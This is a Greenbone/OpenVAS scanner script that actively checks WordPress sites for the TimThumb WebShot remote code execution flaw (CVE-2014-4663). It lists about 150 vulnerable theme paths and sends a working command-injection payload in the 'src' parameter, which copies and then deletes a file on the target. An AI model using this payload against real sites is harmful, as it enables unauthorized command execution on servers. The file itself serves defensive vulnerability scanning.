# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805116");
  script_version("2024-01-09T05:06:46+0000");
  script_cve_id("CVE-2014-4663");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-01-09 05:06:46 +0000 (Tue, 09 Jan 2024)");
  script_tag(name:"creation_date", value:"2014-12-23 11:22:48 +0530 (Tue, 23 Dec 2014)");
  script_name("Binary Moon TimThumb < 2.8.14 RCE Vulnerability - Active Check");

  script_tag(name:"summary", value:"Binary Moon TimThumb is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Flaw is in the timthumb.php script related to the WebShot
  feature that is triggered as input passed via the 'src' parameter is not properly sanitized.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary commands.");

  script_tag(name:"affected", value:"Binary Moon TimThumb version 2.8.13. Prior versions may also be
  affected.");

  script_tag(name:"solution", value:"Update to version 2.8.14 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2014/q2/689");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/33851");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127192");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Jul/4");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Jun/117");
  script_xref(name:"URL", value:"https://code.google.com/p/timthumb/source/detail?r=219");
  script_xref(name:"URL", value:"https://code.google.com/p/timthumb/issues/detail?id=485");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

###########################################################
## Themes links are taken from the below links,
## https://pagely.com/blog/2013/04/partial-list-of-themes-scanned-by-bots-for-timthumb-exploit/
## http://blog.sucuri.net/2011/08/timthumb-security-vulnerability-list-of-themes-including-it.html
###########################################################

vulnPath = make_list(
    "/wp-content/plugins/shortcodes-ultimate/lib/timthumb.php",
    "/wp-content/plugins/wordpress-gallery-plugin/timthumb.php",
    "/wp-content/plugins/igit-posts-slider-widget/timthumb.php",
    "/wp-content/themes/8q/scripts/timthumb.php",
    "/wp-content/themes/Basic/timthumb.php",
    "/wp-content/themes/Bold/timthumb.php",
    "/wp-content/themes/CFWProfessional/timthumb.php",
    "/wp-content/themes/Chameleon/timthumb.php",
    "/wp-content/themes/DeepBlue/timthumb.php",
    "/wp-content/themes/DeepFocus/timthumb.php",
    "/wp-content/themes/DelicateNews/timthumb.php",
    "/wp-content/themes/ElegantEstate/timthumb.php",
    "/wp-content/themes/Event/timthumb.php",
    "/wp-content/themes/GrungeMag/timthumb.php",
    "/wp-content/themes/InterPhase/timthumb.php",
    "/wp-content/themes/LightBright/timthumb.php",
    "/wp-content/themes/Magnificent/timthumb.php",
    "/wp-content/themes/Memoir/timthumb.php",
    "/wp-content/themes/Minimal/timthumb.php",
    "/wp-content/themes/MyProduct/timthumb.php",
    "/wp-content/themes/NewsPro/timthumb.php",
    "/wp-content/themes/Nova/timthumb.php",
    "/wp-content/themes/OptimizePress/timthumb.php",
    "/wp-content/themes/PersonalPress/timthumb.php",
    "/wp-content/themes/PureType/timthumb.php",
    "/wp-content/themes/Reporter/timthumb.php",
    "/wp-content/themes/SimplePress/timthumb.php",
    "/wp-content/themes/TheSource/timthumb.php",
    "/wp-content/themes/Transcript/timthumb.php",
    "/wp-content/themes/a-simple-business-theme/scripts/timthumb.php",
    "/wp-content/themes/a-supercms/timthumb.php",
    "/wp-content/themes/aerial/lib/timthumb.php",
    "/wp-content/themes/aesthete/timthumb.php",
    "/wp-content/themes/albizia/includes/timthumb.php",
    "/wp-content/themes/amphion-lite/script/timthumb.php",
    "/wp-content/themes/aqua-blue/includes/timthumb.php",
    "/wp-content/themes/aranovo/scripts/timthumb.php",
    "/wp-content/themes/arras-theme/library/timthumb.php",
    "/wp-content/themes/arras/library/timthumb.php",
    "/wp-content/themes/arthemix-bronze/scripts/timthumb.php",
    "/wp-content/themes/arthemix-green/scripts/timthumb.php",
    "/wp-content/themes/artisan/includes/timthumb.php",
    "/wp-content/themes/aureola/scripts/timthumb.php",
    "/wp-content/themes/aurorae/timthumb.php",
    "/wp-content/themes/automotive-blog-theme/Quick%20Cash%20Auto/timthumb.php",
    "/wp-content/themes/automotive-blog-theme/timthumb.php",
    "/wp-content/themes/black_eve/timthumb.php",
    "/wp-content/themes/blex/scripts/timthumb.php",
    "/wp-content/themes/bloggnorge-a1/scripts/timthumb.php",
    "/wp-content/themes/blogified/timthumb.php",
    "/wp-content/themes/blue-corporate-hyve-theme/timthumb.php",
    "/wp-content/themes/blue-news/scripts/timthumb.php",
    "/wp-content/themes/bluemag/library/timthumb.php",
    "/wp-content/themes/bombax/includes/timthumb.php",
    "/wp-content/themes/breakingnewz/timthumb.php",
    "/wp-content/themes/brightsky/scripts/timthumb.php",
    "/wp-content/themes/brochure-melbourne/includes/timthumb.php",
    "/wp-content/themes/bt/includes/timthumb.php",
    "/wp-content/themes/business-turnkey/assets/js/timthumb.php",
    "/wp-content/themes/calotropis/includes/timthumb.php",
    "/wp-content/themes/coffeedesk/includes/timthumb.php",
    "/wp-content/themes/comet/scripts/timthumb.php",
    "/wp-content/themes/conceditor-wp-strict/scripts/timthumb.php",
    "/wp-content/themes/constructor/libs/timthumb.php",
    "/wp-content/themes/constructor/timthumb.php",
    "/wp-content/themes/cover-wp/scripts/timthumb.php",
    "/wp-content/themes/coverht-wp/scripts/timthumb.php",
    "/wp-content/themes/cruz/scripts/timthumb.php",
    "/wp-content/themes/dandelion_v2.6.3/functions/timthumb.php",
    "/wp-content/themes/dandelion_v2.6.4/functions/timthumb.php",
    "/wp-content/themes/dark-dream-media/timthumb.php",
    "/wp-content/themes/deep-blue/timthumb.php",
    "/wp-content/themes/delight/scripts/timthumb.php",
    "/wp-content/themes/dimenzion/timthumb.php",
    "/wp-content/themes/duotive-three/includes/timthumb.php",
    "/wp-content/themes/eBusiness/timthumb.php",
    "/wp-content/themes/eNews/timthumb.php",
    "/wp-content/themes/ePhoto/timthumb.php",
    "/wp-content/themes/eStore/timthumb.php",
    "/wp-content/themes/epione/script/timthumb.php",
    "/wp-content/themes/evr-green/scripts/timthumb.php",
    "/wp-content/themes/famous/timthumb.php",
    "/wp-content/themes/featuring/timthumb.php",
    "/wp-content/themes/fliphoto/timthumb.php",
    "/wp-content/themes/flix/timthumb.php",
    "/wp-content/themes/fresh-blu/scripts/timthumb.php",
    "/wp-content/themes/go-green/modules/timthumb.php",
    "/wp-content/themes/granite-lite/scripts/timthumb.php",
    "/wp-content/themes/greydove/timthumb.php",
    "/wp-content/themes/greyzed/functions/efrog/lib/timthumb.php",
    "/wp-content/themes/heli-1-wordpress-theme/images/timthumb.php",
    "/wp-content/themes/ideatheme/timthumb.php",
    "/wp-content/themes/impressio/timthumb/timthumb.php",
    "/wp-content/themes/insignio/images/timthumb.php",
    "/wp-content/themes/iwana-v10/timthumb.php",
    "/wp-content/themes/likehacker/timthumb.php",
    "/wp-content/themes/litepress/scripts/timthumb.php",
    "/wp-content/themes/magup/timthumb.php",
    "/wp-content/themes/make-money-online-theme-1/scripts/timthumb.php",
    "/wp-content/themes/make-money-online-theme-2/scripts/timthumb.php",
    "/wp-content/themes/make-money-online-theme-3/scripts/timthumb.php",
    "/wp-content/themes/make-money-online-theme-4/scripts/timthumb.php",
    "/wp-content/themes/make-money-online-theme/scripts/timthumb.php",
    "/wp-content/themes/mini-lab/functions/timthumb.php",
    "/wp-content/themes/modularity/includes/timthumb.php",
    "/wp-content/themes/modularity2/includes/timthumb.php",
    "/wp-content/themes/moi-magazine/timthumb.php",
    "/wp-content/themes/multidesign/scripts/timthumb.php",
    "/wp-content/themes/muse/scripts/timthumb.php",
    "/wp-content/themes/my-heli/images/timthumb.php",
    "/wp-content/themes/mymag/timthumb.php",
    "/wp-content/themes/mystique/extensions/auto-thumb/timthumb.php",
    "/wp-content/themes/nash/theme-assets/php/timthumb.php",
    "/wp-content/themes/neofresh/timthumb.php",
    "/wp-content/themes/new-green-natural-living-ngnl/scripts/timthumb.php",
    "/wp-content/themes/pearlie/scripts/timthumb.php",
    "/wp-content/themes/pearlie_14%20dec/scripts/timthumb.php",
    "/wp-content/themes/photoria/scripts/timthumb.php",
    "/wp-content/themes/pico/scripts/timthumb.php",
    "/wp-content/themes/postage-sydney/includes/timthumb.php",
    "/wp-content/themes/probluezine/timthumb.php",
    "/wp-content/themes/purevision/scripts/timthumb.php",
    "/wp-content/themes/redlight/includes/timthumb.php",
    "/wp-content/themes/regal/timthumb.php",
    "/wp-content/themes/shaan/timthumb.php",
    "/wp-content/themes/shadow/timthumb.php",
    "/wp-content/themes/simple-but-great/timthumb.php",
    "/wp-content/themes/simple-red-theme/timthumb.php",
    "/wp-content/themes/simplenews_premium/scripts/timthumb.php",
    "/wp-content/themes/simplewhite/timthumb.php",
    "/wp-content/themes/slidette/timThumb/timthumb.php",
    "/wp-content/themes/spotlight/timthumb.php",
    "/wp-content/themes/squeezepage/timthumb.php",
    "/wp-content/themes/suffusion/timthumb.php",
    "/wp-content/themes/swift/includes/timthumb.php",
    "/wp-content/themes/swift/timthumb.php",
    "/wp-content/themes/the_dark_os/tools/timthumb.php",
    "/wp-content/themes/tm-theme/js/timthumb.php",
    "/wp-content/themes/totallyred/scripts/timthumb.php",
    "/wp-content/themes/travelogue-theme/scripts/timthumb.php",
    "/wp-content/themes/tribune/scripts/timthumb.php",
    "/wp-content/themes/true-blue-theme/timthumb.php",
    "/wp-content/themes/ttnews-theme/timthumb.php",
    "/wp-content/themes/twittplus/scripts/timthumb.php",
    "/wp-content/themes/typographywp/timthumb.php",
    "/wp-content/themes/ugly/timthumb.php",
    "/wp-content/themes/unity/timthumb.php",
    "/wp-content/themes/versitility/timthumb.php",
    "/wp-content/themes/vibefolio-teaser-10/scripts/timthumb.php",
    "/wp-content/themes/vulcan/timthumb.php",
    "/wp-content/themes/wp-clear-prem/scripts/timthumb.php",
    "/wp-content/themes/wp-creativix/scripts/timthumb.php",
    "/wp-content/themes/wp-newsmagazine/scripts/timthumb.php",
    "/wp-content/themes/wp-perfect/js/timthumb.php",
    "/wp-content/themes/wp-premium-orange/timthumb.php",
    "/wp-content/themes/wpbus-d4/includes/timthumb.php",
    "/wp-content/themes/zcool-like/timthumb.php"
); ## More timthumb.php paths can be added here

found = FALSE;
foreach eachVulnPath(vulnPath) {

  vulnUrl = dir + eachVulnPath;

  if(http_vuln_check(port:port, url:vulnUrl, check_header:FALSE, usecache:TRUE,
     pattern:">TimThumb version", extra_check:">No image specified<")) {

    randFile = rand_str(length:8, charset:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") + ".php";

    ## Command to copy timthumb.php to a random file
    cpCmd = "/$%28cp$IFS./timthumb.php$IFS./" + randFile + "%29";

    ## Command to delete the copied file
    delCmd = "/$%28rm$IFS./" + randFile + "%29";

    ## Command to copy timthumb.php
    cpUrl = dir + eachVulnPath + "?webshot=1&src=http://localhost" + dir + cpCmd;

    if(http_vuln_check(port:port, url:cpUrl, check_header:FALSE,
       pattern:">A TimThumb error has occurred<", # nb: This is a typo in the TimThumb plugin so don't fix it here...
       extra_check:make_list(">Query String", ">The image being resized is not a valid"))) {

      cpPath = eachVulnPath - "timthumb.php";
      cpFileUrl = dir + cpPath + randFile;

      if(http_vuln_check(port:port, url:cpFileUrl, check_header:FALSE,
         pattern:"^HTTP/1\.[01] 400", extra_check:">TimThumb version")) {

        report = http_report_vuln_url(port:port, url:dir + eachVulnPath);

        ## Command to remove the copied file
        delUrl = dir + eachVulnPath + "?webshot=1&src=http://localhost" + dir + delCmd;

        ## Command to run rm command
        if(http_vuln_check(port:port, url:delUrl, check_header:FALSE,
           pattern:">A TimThumb error has occurred<", # nb: This is a typo in the TimThumb plugin so don't fix it here...
           extra_check:make_list(">Query String", ">The image being resized is not a valid"))) {
          if(http_vuln_check(port:port, url:cpFileUrl, check_header:FALSE,
             pattern:">TimThumb version", extra_check:">No image specified<")) {
            report += '\nUnable to delete the file at: ' + http_report_vuln_url(port:port, url:cpFileUrl, url_only:TRUE);
            report += '\nPlease remove this file manually.';
          }
        }

        found = TRUE;
        security_message(port:port, data:report);
      }
    }
  }
}

if(found)
  exit(0);
else
  exit(99);
